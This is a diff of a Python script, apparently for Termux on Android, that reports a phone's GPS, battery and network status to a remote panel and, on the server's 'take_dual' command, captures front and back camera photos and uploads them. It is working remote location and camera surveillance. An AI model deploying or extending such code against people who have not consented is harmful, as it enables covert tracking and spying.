@@ -9,7 +9,7 @@ from datetime import datetime
 from math import radians, sin, cos, sqrt, atan2
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
-URL_UPLOAD_CAM = "https://nexos-panel.onrender.com/api/upload_camera"
+URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 ARQUIVO_FOTO_FRONTAL = os.path.expanduser("~/nexos_frontal.jpg")
 ARQUIVO_FOTO_TRASEIRA = os.path.expanduser("~/nexos_traseira.jpg")
@@ -34,6 +34,7 @@ print("="*50 + "\n")
 
 ultima_lat_valida = -16.6869
 ultima_lon_valida = -49.2648
+ultimo_timestamp = datetime.now()
 headers_json = {"Content-Type": "application/json"}
 inicio_operacao = datetime.now()
 
@@ -69,60 +70,76 @@ def obter_ram():
             return f"{parts[3]} livres / {parts[1]} total"
     return "N/A"
 
-def calcular_velocidade(lat1, lon1, lat2, lon2):
+def calcular_velocidade(lat1, lon1, lat2, lon2, timestamp_anterior, timestamp_atual):
+    """Calcula velocidade real usando tempo entre medições"""
     if lat1 == lat2 and lon1 == lon2:
         return "0.0 km/h"
     
+    # Tempo real entre medições em horas
+    delta_t = (timestamp_atual - timestamp_anterior).total_seconds() / 3600
+    
+    if delta_t <= 0:
+        return "0.0 km/h"
+    
+    # Distância em km (fórmula de Haversine)
     R = 6371
     dlat = radians(lat2 - lat1)
     dlon = radians(lon2 - lon1)
     a = sin(dlat/2)**2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlon/2)**2
     c = 2 * atan2(sqrt(a), sqrt(1-a))
-    distancia = R * c
-    velocidade = distancia * 3600
+    distancia_km = R * c
+    
+    # Velocidade = distância / tempo
+    velocidade = distancia_km / delta_t
     return f"{velocidade:.1f} km/h"
 
-def capturar_e_enviar_foto(numero_camera, tipo, arquivo_destino):
-    print(f"📸 Tentando capturar camera {numero_camera} ({tipo})...")
-    
+def capturar_foto(numero_camera, arquivo_destino):
+    """Captura uma foto e retorna base64"""
     if os.path.exists(arquivo_destino):
         os.remove(arquivo_destino)
     
     cmd = f"termux-camera-photo -c {numero_camera} {arquivo_destino}"
     run_command(cmd)
-    time.sleep(2)
+    time.sleep(2.5)
     
     if os.path.exists(arquivo_destino) and os.path.getsize(arquivo_destino) > 0:
-        try:
-            with open(arquivo_destino, "rb") as img_file:
-                foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
-            
-            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
-            
-            response = requests.post(
-                URL_UPLOAD_CAM,
-                data=json.dumps(payload),
-                headers=headers_json,
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                print(f"🚀 -> Lente {tipo.upper()} enviada com sucesso!")
-                return True
-            else:
-                print(f"❌ Erro no upload: {response.status_code}")
-                return False
-        except Exception as e:
-            print(f"❌ Erro ao processar foto {tipo}: {e}")
+        with open(arquivo_destino, "rb") as img_file:
+            foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
+        return foto_b64
+    return None
+
+def enviar_fotos_lote(foto_frontal_b64, foto_traseira_b64):
+    """Envia as duas fotos em um único pacote"""
+    if not foto_frontal_b64 and not foto_traseira_b64:
+        return False
+    
+    payload = {
+        "device_id": DEVICE_ID,
+        "photo_front": foto_frontal_b64 or "",
+        "photo_back": foto_traseira_b64 or ""
+    }
+    
+    try:
+        response = requests.post(
+            URL_UPLOAD_LOTE,
+            data=json.dumps(payload),
+            headers=headers_json,
+            timeout=30
+        )
+        
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"❌ Erro no upload do lote: {response.status_code}")
             return False
-    else:
-        print(f"❌ Arquivo nao foi criado: {arquivo_destino}")
+    except Exception as e:
+        print(f"❌ Erro ao enviar lote: {e}")
         return False
 
-lat_anterior = ultima_lat_valida
-lon_anterior = ultima_lon_valida
-
+# Loop principal
 while True:
+    timestamp_atual = datetime.now()
+    
     battery = "N/A"
     status_bat = "Desconhecido"
     temp_bat = "N/A"
@@ -154,11 +171,17 @@ while True:
             if loc_data.get("latitude") and loc_data.get("longitude"):
                 lat = loc_data.get("latitude")
                 lon = loc_data.get("longitude")
-                velocidade = calcular_velocidade(lat_anterior, lon_anterior, lat, lon)
-                lat_anterior = lat
-                lon_anterior = lon
+                
+                # Velocidade com timestamp real
+                velocidade = calcular_velocidade(
+                    ultima_lat_valida, ultima_lon_valida,
+                    lat, lon,
+                    ultimo_timestamp, timestamp_atual
+                )
+                
                 ultima_lat_valida = lat
                 ultima_lon_valida = lon
+                ultimo_timestamp = timestamp_atual
         except: pass
     
     uptime = str(datetime.now() - inicio_operacao).split('.')[0]
@@ -179,7 +202,7 @@ while True:
         "temperature": temperatura,
         "network": rede,
         "ram": ram,
-        "timestamp": datetime.now().isoformat()
+        "timestamp": timestamp_atual.isoformat()
     }
     
     try:
@@ -188,22 +211,24 @@ while True:
             res_data = response.json()
             comando_cam = str(res_data.get("comando_cam", "wait")).lower()
             
-            print(f"🛰️ [{datetime.now().strftime('%H:%M:%S')}] OK | Bat:{battery}% | Rede:{rede} | Vel:{velocidade}")
-            print(f"   RAM:{ram} | Temp:{temperatura} | Up:{uptime}")
+            print(f"🛰️ [{timestamp_atual.strftime('%H:%M:%S')}] OK | Bat:{battery}% | Vel:{velocidade} | {rede}")
             
             if comando_cam == "take_dual":
-                print("📸 [ACAO] CAPTURA DUPLA INICIADA...")
-                sucesso_tras = capturar_e_enviar_foto(0, "back", ARQUIVO_FOTO_TRASEIRA)
-                time.sleep(3)
-                sucesso_front = capturar_e_enviar_foto(1, "front", ARQUIVO_FOTO_FRONTAL)
+                print("\n📸 [DUAL] Capturando em lote...")
                 
+                # Tira as duas fotos
+                foto_tras = capturar_foto(0, ARQUIVO_FOTO_TRASEIRA)
+                foto_front = capturar_foto(1, ARQUIVO_FOTO_FRONTAL)
+                
+                # Envia tudo junto
+                if enviar_fotos_lote(foto_front, foto_tras):
+                    print("🎯 Lote enviado!\n")
+                else:
+                    print("⚠️ Falha no lote\n")
+                
+                # Limpeza
                 for arquivo in [ARQUIVO_FOTO_FRONTAL, ARQUIVO_FOTO_TRASEIRA]:
                     if os.path.exists(arquivo): os.remove(arquivo)
-                
-                if sucesso_tras and sucesso_front:
-                    print("🎯 [FIM] Captura dupla concluida com sucesso!")
-                else:
-                    print(f"⚠️ [FIM] Captura parcial - Frontal: {sucesso_front}, Traseira: {sucesso_tras}")
                     
     except Exception as e:
         print(f"⚠️ Alerta: {e}")
